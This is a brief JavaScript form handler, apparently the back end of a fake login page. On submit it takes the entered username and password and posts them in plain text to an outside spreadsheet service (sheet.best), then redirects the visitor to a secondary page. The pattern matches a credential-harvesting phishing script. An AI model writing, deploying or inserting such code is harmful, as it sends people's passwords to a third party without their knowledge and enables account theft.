const formulario = document.getElementById('formulario');

formulario.addEventListener('submit', async (e) => {
  e.preventDefault();

  await fetch('https://sheet.best/api/sheets/9389da1e-9165-4f23-a7c6-acc17865742b', {
    method: 'POST',
    mode: 'cors',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      "username": formulario.username.value,
      "password": formulario.password.value,
    })
  });

  window.location.href = "pagina_secundaria.html";
});
